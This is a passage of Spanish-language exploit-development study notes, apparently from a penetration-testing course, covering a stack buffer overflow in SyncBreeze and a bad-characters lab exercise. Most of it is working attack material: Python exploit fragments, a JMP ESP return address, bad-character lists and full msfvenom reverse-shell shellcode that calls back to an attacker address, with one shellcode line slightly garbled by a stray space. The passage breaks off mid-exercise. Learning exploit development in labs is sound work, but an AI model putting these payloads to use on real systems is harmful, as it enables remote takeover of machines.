¡Ahora tenemos control total sobre EIP y deberíamos poder controlar efectivamente el flujo de ejecución de SyncBreeze! Sin embargo, debemos reemplazar nuestro marcador de posición 0x42424242 y redirigir el flujo de la aplicación a una dirección válida que apunte al código que queremos ejecutar.

<br />


##### 2.2.3. Locating space for our shellcode.

En este punto, sabemos que podemos colocar una dirección arbitraria en EIP, pero no sabemos qué dirección real usar. Además, no podemos elegir una dirección hasta que comprendamos hacia dónde podemos redirigir el flujo de ejecución. Por lo tanto, primero nos centraremos en el código ejecutable que queremos que ejecute el objetivo y, lo que es más importante, comprenderemos dónde encajará este código en la memoria.

Idealmente, queremos que el objetivo ejecute algún código de nuestra elección, como una reverse shell. Podemos incluir dicho *shellcode* como parte del búfer de entrada que desencadena el bloqueo.

*Shellcode es una colección de instrucciones de assembly que, cuando se ejecutan, realizan una acción deseada del atacante. Esto suele ser abrir un reverseshell o de enlace, pero también puede incluir acciones más complejas.*

Usaremos Metasploit Framework para generar nuestra *payload* de shellcode . 

Una inspección más detallada de la pila en el momento del bloqueo revela que las primeras cuatro C de nuestro búfer aterrizaron en la dirección 0x01307460, y ESP que almacena 0x01307464 apunta a las siguientes cuatro C de nuestro búfer:

```
01307444   41414141  AAAA
01307448   41414141  AAAA
0130744C   41414141  AAAA
01307450   41414141  AAAA
01307454   41414141  AAAA
01307458   41414141  AAAA
0130745C   42424242  BBBB
01307460   43434343  CCCC
01307464   43434343  CCCC
01307468   43434343  CCCC
0130746C   43434343  CCCC
01307470   00000000  
01307474   00000000  
```

Por experiencia, sabemos que un payload estándar de reverseshell requiere aproximadamente 350-400 bytes de espacio. Sin embargo, la lista anterior muestra claramente que solo hay dieciséis C en el búfer, que no es suficiente espacio para nuestro shellcode. La forma más sencilla de solucionar este problema es intentar aumentar la longitud del búfer en nuestro exploit de 800 bytes a 1500 bytes y ver si esto permite suficiente espacio para nuestro shellcode sin romper la condición de desbordamiento del búfer o cambiar la naturaleza del bloqueo.

Según la aplicación y el tipo de vulnerabilidad, puede haber restricciones en la duración de nuestra entrada. En algunos casos, aumentar la longitud de un búfer puede provocar un bloqueo completamente diferente, ya que el búfer más grande sobrescribe los datos adicionales en la pila que utiliza la aplicación de destino.

Para esta actualización, agregaremos los caracteres 'D' como marcador de posición para nuestro código shell:

```
...
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
...
```

Una vez que se envía el nuevo búfer más largo, se puede observar un bloqueo similar en el depurador. Esta vez, sin embargo, encontramos que ESP apunta a un valor de dirección diferente, 0x030E745C:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221182737.png' | relative_url }}" text-align="center"/>
</div>

Como tal, ESP apunta a los caracteres _D_ (0x44 en hexadecimal) que actúan como marcador de posición para nuestro código shell:

```
030E7448   41414141  AAAA
030E744C   41414141  AAAA
030E7450   41414141  AAAA
030E7454   42424242  BBBB
030E7458   43434343  CCCC
030E745C   44444444  DDDD
030E7460   44444444  DDDD
030E7464   44444444  DDDD
030E7468   44444444  DDDD  
030E746C   44444444  DDDD
...
030E745C   44444444  DDDD  
```

Este pequeño truco nos ha proporcionado mucho más espacio para trabajar. Tras un examen más detallado, notamos que ahora tenemos un total de 704 bytes (0x030E771C - 0x030E745C = 704) de espacio libre para nuestro shellcode.

Además, tenga en cuenta que la dirección de ESP cambia cada vez que ejecutamos el exploit, pero aún apunta a nuestro búfer. Abordaremos esto en una sección siguiente, pero primero tenemos otro obstáculo que superar.

<br />


##### 2.2.4. Checking for Bad Characters.

Dependiendo de la aplicación, el tipo de vulnerabilidad y los protocolos en uso, puede haber ciertos caracteres que se consideren "malos" y no deben usarse en nuestro búfer, dirección de retorno o código de shell. Un ejemplo de un carácter erróneo común, especialmente en los desbordamientos de búfer provocados por operaciones de copia de cadenas no verificadas, es el byte nulo, 0x00. Este carácter se considera malo porque un byte nulo también se usa para terminar una cadena en lenguajes de bajo nivel como C/C++. Esto hará que finalice la operación de copia de cadena, truncando efectivamente nuestro búfer en la primera instancia de un byte nulo.

Además, dado que enviamos el exploit como parte de una solicitud HTTP POST, debemos evitar 0x0D, el carácter de retorno, que significa el final de un campo HTTP (en este caso, el nombre de usuario).

Un desarrollador de exploits experimentado siempre buscará caracteres malos. Una forma de determinar qué caracteres son malos para un exploit en particular es enviar todos los caracteres posibles, de 0x00 a 0xFF, como parte de nuestro búfer, y ver cómo la aplicación trata estos caracteres después del bloqueo.

Para hacer esto, reutilizaremos el script de prueba de concepto y reemplazaremos nuestras D con todos los caracteres hexadecimales posibles, excepto 0x00.:

```
#!/usr/bin/python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
  print "\nSending evil buffer..."
  
  filler = "A" * 780
  eip = "B" * 4
  offset = "C" * 4

  inputBuffer = filler + eip + offset + badchars
  
  content = "username=" + inputBuffer + "&password=A"
...
```

Después de ejecutar nuestra prueba de concepto, podemos hacer clic derecho en ESP y seleccionar *Follow in dump* para mostrar los caracteres hexadecimales del búfer de entrada en la memoria:

```
0326744C  41 41 41 41 41 41 41 41  AAAAAAAA
03267454  42 42 42 42 43 43 43 43  BBBBCCCC
0326745C  01 02 03 04 05 06 07 08  
03267464  09 00 C3 00 90 BC C3 00  ..Ã.¼Ã.
0326746C  10 6C C4 00 06 00 00 00  lÄ....
03267474  18 AB 26 03 00 00 00 00  «&....
```

El resultado anterior muestra que solo los valores hexadecimales 0x01 a 0x09 llegaron al búfer de memoria de la pila. No hay señales del siguiente carácter, 0x0A, que debería estar en la dirección 0x03267465.

Esto no es sorprendente si consideramos que el carácter 0x0A representa un avance de línea, que finaliza un campo HTTP de la misma manera que un retorno de carro.

Cuando eliminamos el carácter 0x0A de nuestro script de prueba y volvemos a enviar la carga útil, el búfer resultante finaliza después del valor hexadecimal 0x0C  lo que indica que 0x0D, el carácter de retorno, también es un carácter incorrecto, como ya hemos discutido:

```
01B1744C  41 41 41 41 41 41 41 41  AAAAAAAA
01B17454  42 42 42 42 43 43 43 43  BBBBCCCC
01B1745C  01 02 03 04 05 06 07 08  
01B17464  09 0B 0C 00 38 BD CE 00  ...8½Î.
01B1746C  10 6C CF 00 06 00 00 00  lÏ....
01B17474  18 AB B1 01 00 00 00 00  «±....
```

Continuando de esta manera, descubrimos que 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B y 0x3D destrozarán nuestro búfer de entrada mientras intentan desbordar el búfer de destino.

En este punto, tenemos el control del registro EIP y sabemos que podemos colocar nuestro shellcode en un espacio de memoria al que se puede acceder fácilmente a través del registro ESP. También sabemos qué caracteres son seguros para nuestro búfer y cuáles no. Nuestra próxima tarea es encontrar una manera de redirigir el flujo de ejecución al código de shell ubicado en la dirección de memoria a la que apunta el registro ESP en el momento del bloqueo.

El enfoque más intuitivo es intentar reemplazar las B que sobrescriben EIP con la dirección que aparece en el registro ESP en el momento del bloqueo. Sin embargo, como mencionamos anteriormente, el valor de ESP cambia de un choque a otro. Las direcciones de pila cambian con frecuencia, especialmente en aplicaciones con subprocesos como SyncBreeze, ya que cada subproceso tiene su región de pila reservada en la memoria asignada por el sistema operativo.

Por lo tanto, codificar una dirección de pila específica no sería una forma confiable de llegar a nuestro búfer.

<br />

**Exercises**

**3. Entonces puede generar shellcode, pero ¿puede generar shellcode que funcione en un programa real? Esta vez, deberá generar el código de shell y probar ese código de shell en busca de caracteres incorrectos para asegurarse de que se ejecutará como espera. El programa _bad-characters-1_ también toma shellcode como entrada, pero es un poco más quisquilloso; el binario parece estar eliminando algunos caracteres específicos del búfer almacenado antes de ejecutar _CALL EBX_ que ejecuta su carga útil. Para ayudar con las pruebas y la práctica en su cliente de Windows, puede descargar bad-characters-windows-1.exe desde el servidor web VM n.º 1 en el puerto 80. Una vez que esté listo, conéctese al puerto 4444 de la VM n.º 1 a través de netcat y obtenga un shell enviando una carga útil de shell inverso sin formato de 32 bits generada por msfvenom que no contiene los caracteres incorrectos especificados. Luego lea _flag.txt_ para obtener la bandera.**


##### 2.2.5. Finding a Return Address.

Hasta ahora sabemos dónde podemos almacenar nuestro shellcode en la dirección señalada por el registro ESP, pero eso no significa que nuestro código vaya a ser ejecutado por el procesador una vez se produzca el desbordamiento. 

Una solución es aprovechar una instrucción JMP ESP, que como sugiere su nombre, "salta" a la dirección a la que apunta ESP cuando se ejecuta. Si podemos encontrar una dirección estática confiable que contenga esta instrucción, podemos sobreescribir el EIP con esta dirección y, en el momento del bloqueo, EIP hará que el flujo de ejecución salte sobre la instrucción JMP ESP y de ahí a nuestro shellcode.

Muchas bibliotecas de soporte en Windows contienen esta instrucción de uso común, pero *necesitamos encontrar una referencia que cumpla con ciertos criterios*.

- Primero, las direcciones utilizadas en la biblioteca deben ser estáticas, lo que elimina las bibliotecas compiladas con soporte ASLR. 

- En segundo lugar, la dirección de la instrucción no debe contener ninguno de los *badchars* que romperían el exploit, ya que la dirección formará parte de la entrada del búffer.

Podemos usar el script Immunity Debugger, *mona.py*, desarrollado por el equipo de Corelan, para comenzar nuestra búsqueda de dirección de retorno. Primero, solicitaremos información sobre todas las DLL (o módulos) cargadas por SyncBreeze en el espacio de memoria del proceso con *!mona modules* para generar el resultado que se muestra a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230222094121.png' | relative_url }}" text-align="center"/>
</div>

Las columnas en esta salida incluyen la ubicación actual de la memoria (direcciones base y superior), el tamaño del módulo, varios indicadores, la versión del módulo, el nombre del módulo y la ruta.

Podemos ver que el ejecutable syncbrs.exe tiene SafeSEH (Structured Exception Handler Overwrite, una técnica de protección de memoria), ASLR y NXCompat (protección DEP) deshabilitados.

En otras palabras, el ejecutable no se ha compilado con ningún esquema de protección de memoria y siempre se cargará de manera confiable en la misma dirección, lo que lo hace ideal para nuestros propósitos.

Sin embargo, siempre se carga en la dirección base 0x00400000, lo que significa que las direcciones de todas las instrucciones (0x004XXXXX) contendrán caracteres nulos, que no son adecuados para nuestro búfer.

Al buscar a través del output, encontramos que LIBSPP.DLL también se adapta a nuestras necesidades y el rango de direcciones no parece contener caracteres incorrectos. Esto es perfecto para nuestras necesidades. Ahora necesitamos encontrar la dirección de una instrucción JMP ESP natural dentro de este módulo.

Sugerencia avanzada: si esta aplicación se compiló con soporte para DEP, nuestra dirección JMP ESP tendría que estar ubicada en el segmento de código *.text* del módulo, ya que ese es el único segmento con permisos de Lectura (R) y Ejecutable (E). Sin embargo, dado que DEP no está habilitado, podemos usar instrucciones desde cualquier dirección en este módulo.

Podríamos usar comandos nativos dentro del Immunity Debugger para buscar nuestra instrucción JMP ESP, pero la búsqueda tendría que realizarse en múltiples áreas de datos dentro de la DLL. En su lugar, podemos usar *mona.py* para realizar una búsqueda exhaustiva de la representación binaria o hexadecimal (o código de operación ) de la instrucción de assembly.

Para encontrar el código de operación equivalente a JMP ESP, podemos usar el script Ruby de Metasploit NASM Shell, msf-nasm_shell , que produce los resultados que se muestran en el Listado 17:

```
kali@kali:~$ msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm >
```

Podemos buscar JMP ESP usando la representación hexadecimal del código de operación (0xFFE4) en todas las secciones de LIBSPP.DLL con mona.py find .

Especificaremos el contenido de la búsqueda con -s y el valor escapado de la cadena hexadecimal del código de operación, "\\xff\\xe4" . Además, proporcionamos el nombre del módulo requerido con la opción -m .

El resultado del comando final, !mona find -s "\\xff\\xe4" -m "libspp.dll" , se muestra en la Figura 13:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230222094550.png' | relative_url }}" text-align="center"/>
</div>

En este ejemplo, la salida revela una dirección que contiene una instrucción JMP ESP (0x10090c83) y, afortunadamente, la dirección no contiene ninguno de nuestros caracteres incorrectos.

Para ver el contenido de 0x10090c83 en la ventana del desensamblador, mientras la ejecución está en pausa, haremos clic en el botón "Go to address in Disassembler" e ingresaremos la dirección. Desde aquí podemos ver que efectivamente se traduce a una instrucción JMP ESP.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230222094844.png' | relative_url }}" text-align="center"/>
</div>

Si redirigimos EIP a esta dirección en el momento del bloqueo, se ejecutará la instrucción JMP ESP, lo que conducirá el flujo de ejecución a nuestro código de shell.

Podemos probar esto actualizando la variable *eip* para reflejar esta dirección en nuestra prueba de concepto:

```
...
filler = "A" * 780
eip = "\x83\x0c\x09\x10"
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
...
```

Tenga en cuenta que la dirección ingresada arriba está en orden inverso. Esto se debe al orden endian de 3 bytes. El sistema operativo puede almacenar direcciones y datos en la memoria en diferentes formatos. En términos generales, el formato utilizado para almacenar direcciones en la memoria depende de la arquitectura en la que se ejecuta el sistema operativo. Little endian es actualmente el formato más utilizado y es utilizado por las arquitecturas x86 y AMD64, mientras que big endian fue históricamente utilizado por las arquitecturas Sparc y PowerPC. En el formato Little Endian, el byte de orden inferior del número se almacena en la memoria en la dirección más baja y el byte de orden superior en la dirección más alta. Por lo tanto, tenemos que almacenar la dirección de retorno en orden inverso en nuestro búfer para que la CPU la interprete correctamente en la memoria.

Usando @ en el depurador, colocaremos un punto de interrupción en la dirección 0x10090c83 para seguir la ejecución de la instrucción JMP ESP, y luego ejecutaremos nuestro exploit nuevamente. El resultado se muestra en la Figura 15:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image Punto.png' | relative_url }}" text-align="center"/>
</div>

Nuestro depurador muestra que, de hecho, alcanzamos nuestro JMP ESP y alcanzamos el punto de interrupción que establecimos previamente. Presionar & en el depurador hará un solo paso en nuestro marcador de posición de shellcode, que actualmente es solo un montón de D.

¡Excelente! Ahora solo necesitamos generar un shellcode que funcione y nuestro exploit estará completo.

<br />


##### 2.2.6. Generating Shellcode with Metasploit.

Antes de nada, es importante entender el concepto de lo que es un ShellCode. Un shellcode es un stream de bytes que conforman un payload malicioso que generalmente abre una bind-shell o una reverse-shell.

MSFvenom es una combinación de Msfpayload y Msfencode, colocando ambas herramientas en una sola instancia de Framework. Puede generar payloads de shellcode y codificarlas usando una variedad de codificadores diferentes.

MSFvenom reemplazó tanto a msfpayload como a msfencode a partir del 8 de junio de 2015.

Actualmente, el comando msfvenom puede generar automáticamente más de 500 opciones de carga útil de shellcode, como se muestra en el siguiente extracto:

```
kali@kali:~$ msfvenom -l payloads

Framework Payloads (546 total) [--payload <value>]
==================================================

    Name                            Description
    ----                            -----------
    aix/ppc/shell_bind_tcp          Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port         Spawn a shell on an established connection
    aix/ppc/shell_interact          Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp       Connect back to attacker and spawn a command shell
...
    windows/shell_reverse_tcp       Connect back to attacker and spawn a command shell
...
```

El comando msfvenom es bastante fácil de usar. Usaremos -p para generar un payload básica llamada *windows/shell_reverse_tcp*, que actúa como un shell inverso de Netcat. Esta carga útil requiere como mínimo un parámetro *LHOST*, que define la dirección IP de destino para el shell. También se puede definir un parámetro *LPORT* opcional que especifique el puerto de conexión y usaremos el indicador de formato -f para seleccionar el código de shell con formato C.

El comando completo msfvenom que genera nuestro shellcode es el siguiente:

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x12\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```

Parecía bastante simple, pero si miramos con atención podemos identificar caracteres incorrectos (como bytes nulos) en el shellcode generado.

Cuando no podemos usar shellcode genérico, debemos codificarlo para que se adapte a nuestro entorno de explotación objetivo. Esto podría significar transformar nuestro shellcode en una carga útil alfanumérica pura, deshacerse de los caracteres malos, etc.

Usaremos un codificador polimórfico avanzado, *shikata_ga_nai*, para codificar nuestro shellcode y también informaremos al codificador de los caracteres malos conocidos con la opción -b :

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 22 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
unsigned char buf[] =
"\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
"\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"
"\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"
"\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"
"\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\ x52\x2a\x94\xa6"
"\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"
"\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"
"\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"
"\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"
"\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"
"\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"
"\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"
"\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"
"\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"
"\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"
"\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"
"\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"
"\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"
"\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"
"\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"
"\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"
"\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"
"\x5f\xa3\x05\x74\x5f\xe6";
```

<br />

#### 2.3. Practice.

##### 2.3.1. BadChars.

**3. Entonces puede generar shellcode, pero ¿puede generar shellcode que funcione en un programa real? Esta vez, deberá generar el código de shell y probar ese código de shell en busca de caracteres incorrectos para asegurarse de que se ejecutará como espera. El programa *bad-characters-1* también toma shellcode como entrada, pero es un poco más quisquilloso; el binario parece estar eliminando algunos caracteres específicos del búfer almacenado antes de ejecutar CALL EBX que ejecuta el payload. Para ayudar con las pruebas y la práctica en su cliente de Windows, puede descargar bad-characters-windows-1.exe desde el servidor web VM n.º 1 en el puerto 80. Una vez que esté listo, conéctese al puerto 4444 de la VM n.º 1 a través de netcat y obtenga un shell enviando una carga útil de shell inverso sin formato de 32 bits generada por msfvenom que no contiene los caracteres incorrectos especificados. Luego lea _flag.txt_ para obtener la bandera.**

NOTA: se debe usar la siguiente sintaxis al probar el exploit contra la máquina virtual de destino: `cat exploit.txt - | nc <target IP> 4444`. Luego presione CTRL+C para desencadenar la ejecución del exploit. Si el exploit no tuvo éxito contra la máquina virtual de destino, se debe realizar una reversión.


Descargamos el binario desde nuestra kali con:

```
curl http://192.168.244.60:80/bad-characters-windows-1.exe
```

Y luego lo arrastramos a nuestro host y de ahí a nuestra máquina Windows donde lo asociamos Immunity Debugger con *File* > *Open* > *bad-characters-windows-1.exe*.

Una vez lo ejecutamos se abre una terminal y encontramos que lee los contenidos de un fichero llamado 'exploit.txt' en la misma localización del ejecutable.

Sin embargo, cuando escribimos el array de hexchars el programa los lee como ASCII luego no podemos escribir directamente sobre el fichero en hexadecimal en su lugar utilizamos el siguiente código python:

```python
#!/usr/bin/python

badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

f = open("exploit.txt", "wb")
f.write(badchars)
f.close()
```

El script anterior almacena en una variable una serie de caracteres hexadecimales en forma de bytes (por eso la 'b' delante) y escribe estos bytes sobre un fichero llamado exploit.txt

Comprobamos haciendo un hexdump del fihcero recién creado:

```bash
> xxd -g 1 exploit.txt
00000000: 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10  ................
00000010: 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20  ............... 
00000020: 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30  !"#$%&'()*+,-./0
00000030: 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40  123456789:;<=>?@
00000040: 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
00000050: 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
00000060: 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
00000070: 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
00000080: 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90  ................
00000090: 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0  ................
000000a0: a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0  ................
000000b0: b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0  ................
000000c0: c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0  ................
000000d0: d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0  ................
000000e0: e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0  ................
000000f0: f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff     ...............

```

Ahora, trasportamos este fichero sobre la máquina cliente windows y ejecutamos de nuevo el programa. Una vez lo tenemos cargado lo iniciamos dandole a F9 y normalmente, buscaríamos el contenido en la ventana superior derecha sobre el registro ESP ya que intencionalmente lo colocaríamos ahí, sin embargo en este caso, buscamos sobre el registro EBX ya que sabemos por el enunciado que cuando la función se ejecuta llama al registro EBX (CALL EBX), le damos a "Follow in dump":

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230222201233.png' | relative_url }}" text-align="center"/>
</div>

Ahora observamos que existen varios caracteres hexadecimales que el programa trata de inadecuada para nuestros intereses ya que en su posición (recordamos que hemos introducido una serie de caracteres hexadecimales en orden) en lugar de estar ese caracter hay otro, en este caso un 00 (aunque podría ser cualquier cosa). Así, descartamos los caracteres: \\x0a, \\x20, \\x2F, \\x95, \\xA7.
 
De esta forma, incluimos el siguiente comando en MSFVenom:

